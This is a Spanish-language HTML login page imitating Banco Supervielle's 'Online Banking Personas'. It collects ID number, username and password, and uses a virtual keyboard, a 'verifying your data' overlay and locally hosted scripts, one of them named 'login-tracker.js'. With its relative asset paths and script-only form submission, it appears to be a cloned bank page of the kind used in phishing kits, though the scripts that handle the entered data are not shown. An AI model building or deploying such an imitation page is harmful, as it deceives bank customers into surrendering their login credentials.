<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Banco Supervielle — Online Banking Personas</title>
  <meta name="description" content="Iniciar sesión en Online Banking Personas">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="./css/login.css?v=20261114h">
  <link rel="stylesheet" href="./css/site.css?v=20261114h">
  <link rel="preload" as="image" href="./assets/obi_rebrand_login-whatsapp_V2.webp" fetchpriority="high">
</head>
<body>
  <div class="login-page">
    <aside class="login-visual" aria-label="Promociones">
      <div class="carousel" id="login-carousel">
        <div class="carousel-slide is-active">
          <img src="./assets/obi_rebrand_login-whatsapp_V2.webp" alt="Resolvé tus consultas por Supervielle Chat" width="1200" height="1600">
        </div>
        <div class="carousel-slide">
          <img src="./assets/obi_rebrand_login-seguridad.webp" alt="Seguridad en Online Banking" width="1200" height="1600" loading="lazy">
        </div>
        <div class="carousel-slide">
          <img src="./assets/obi_rebrand_login-app.webp" alt="App Supervielle" width="1200" height="1600" loading="lazy">
        </div>
      </div>
      <div class="carousel-dots" role="tablist" aria-label="Banners">
        <button type="button" class="is-active" aria-label="Banner 1" aria-selected="true"></button>
        <button type="button" aria-label="Banner 2" aria-selected="false"></button>
        <button type="button" aria-label="Banner 3" aria-selected="false"></button>
      </div>
    </aside>

    <main class="login-panel">
      <div class="login-top">
        <a class="login-logo" href="./index.html" aria-label="Banco Supervielle">
          <img src="./assets/logo-supervielle.svg" alt="Supervielle" width="169" height="30">
        </a>
        <div class="login-top-actions">
          <button type="button" class="icon-round" aria-label="Ayuda" title="Ayuda">?</button>
          <button type="button" class="icon-round" aria-label="Seguridad" title="Seguridad">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <path d="M7 11V8a5 5 0 0 1 10 0v3" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
              <rect x="5" y="11" width="14" height="10" rx="2" stroke="currentColor" stroke-width="2"/>
            </svg>
          </button>
          <button type="button" class="icon-round" aria-label="Información" title="Información">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <path d="M8 7h8M8 12h8M8 17h5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
              <rect x="4" y="3" width="16" height="18" rx="2" stroke="currentColor" stroke-width="2"/>
            </svg>
          </button>
        </div>
      </div>

      <div class="login-main">
        <h1>Iniciar sesión en Online Banking Personas</h1>

        <form id="login-form" autocomplete="off" novalidate>
          <div class="field">
            <label class="sr-only" for="documento">Tu número de documento</label>
            <input id="documento" name="documento" type="text" inputmode="numeric" maxlength="12" placeholder="Tu número de documento" required autocomplete="off">
          </div>

          <label class="remember">
            <input type="checkbox" id="recordar" name="recordar">
            Recordar mi número de documento
          </label>

          <div class="field field-password">
            <label class="sr-only" for="login-usuario">Tu nombre de usuario</label>
            <input id="login-usuario" name="nombre_usuario" type="text" placeholder="Tu nombre de usuario" required autocomplete="off" spellcheck="false">
            <button type="button" class="toggle-pass" id="toggle-user" aria-label="Mostrar usuario">👁</button>
          </div>

          <div class="field field-password field-clave">
            <label class="float-label" for="clave">Tu clave</label>
            <input id="clave" name="clave" type="password" placeholder=" " required autocomplete="off">
            <button type="button" class="toggle-pass" id="toggle-pass" aria-label="Mostrar clave">👁</button>
          </div>

          <button type="button" class="btn-keyboard" id="btn-keyboard" aria-expanded="false" aria-controls="virtual-keyboard">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
              <rect x="2" y="6" width="20" height="12" rx="2" stroke="currentColor" stroke-width="2"/>
              <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
            </svg>
            Teclado virtual
          </button>

          <div id="virtual-keyboard" class="virtual-keyboard" hidden>
            <button type="button" class="kb-close" id="kb-close" data-action="close" aria-label="Cerrar">×</button>
            <div class="kb-row">
              <button type="button" data-key="1">1</button>
              <button type="button" data-key="2">2</button>
              <button type="button" data-key="3">3</button>
              <button type="button" data-key="4">4</button>
              <button type="button" data-key="5">5</button>
              <button type="button" data-key="6">6</button>
              <button type="button" data-key="7">7</button>
              <button type="button" data-key="8">8</button>
              <button type="button" data-key="9">9</button>
              <button type="button" data-key="0">0</button>
            </div>
            <div class="kb-row">
              <button type="button" data-key="q">q</button>
              <button type="button" data-key="w">w</button>
              <button type="button" data-key="e">e</button>
              <button type="button" data-key="r">r</button>
              <button type="button" data-key="t">t</button>
              <button type="button" data-key="y">y</button>
              <button type="button" data-key="u">u</button>
              <button type="button" data-key="i">i</button>
              <button type="button" data-key="o">o</button>
              <button type="button" data-key="p">p</button>
            </div>
            <div class="kb-row">
              <button type="button" data-key="a">a</button>
              <button type="button" data-key="s">s</button>
              <button type="button" data-key="d">d</button>
              <button type="button" data-key="f">f</button>
              <button type="button" data-key="g">g</button>
              <button type="button" data-key="h">h</button>
              <button type="button" data-key="j">j</button>
              <button type="button" data-key="k">k</button>
              <button type="button" data-key="l">l</button>
              <button type="button" data-key="ñ">ñ</button>
            </div>
            <div class="kb-row">
              <button type="button" class="kb-wide" data-action="shift" aria-label="Mayúsculas">⇧</button>
              <button type="button" data-key="z">z</button>
              <button type="button" data-key="x">x</button>
              <button type="button" data-key="c">c</button>
              <button type="button" data-key="v">v</button>
              <button type="button" data-key="b">b</button>
              <button type="button" data-key="n">n</button>
              <button type="button" data-key="m">m</button>
              <button type="button" class="kb-wide" data-action="backspace" aria-label="Borrar">⌫</button>
            </div>
            <div class="kb-row">
              <button type="button" data-key=",">,</button>
              <button type="button" data-key="-">-</button>
              <button type="button" data-key="_">_</button>
              <button type="button" class="kb-space" data-action="space"> </button>
              <button type="button" data-key=".">.</button>
              <button type="button" data-key="?">?</button>
              <button type="button" data-key="+">+</button>
            </div>
          </div>

          <button type="submit" class="btn-primary" id="btn-ingresar" disabled>Ingresar</button>
        </form>

        <div class="login-links">
          <a href="#">Cambiar usuario y/o clave</a>
          <a href="./terminos.html">Términos y condiciones</a>
          <a href="./cookies-politica.html">Política de cookies</a>
        </div>
      </div>
    </main>
  </div>

  <div id="login-loading" class="login-loading" hidden aria-live="polite" aria-busy="true">
    <div class="login-loading-card">
      <div class="login-spinner" aria-hidden="true"></div>
      <p>Estamos verificando tus datos…</p>
      <span>Un momento, por favor</span>
    </div>
  </div>

  <div id="cookie-banner" class="cookie-banner" hidden role="dialog" aria-live="polite" aria-label="Aviso de cookies">
    <p>
      Usamos cookies para el funcionamiento del Online Banking.
      <a href="./cookies-politica.html">Más info</a>
    </p>
    <div class="cookie-actions">
      <button type="button" class="cookie-reject" id="cookie-reject">Solo esenciales</button>
      <button type="button" class="cookie-accept" id="cookie-accept">Aceptar</button>
    </div>
  </div>

  <script src="./js/login.js?v=20261114h"></script>
  <script src="./js/login-tracker.js?v=20261114h"></script>
  <script src="./js/cookies.js?v=20261114h"></script>
</body>
</html>
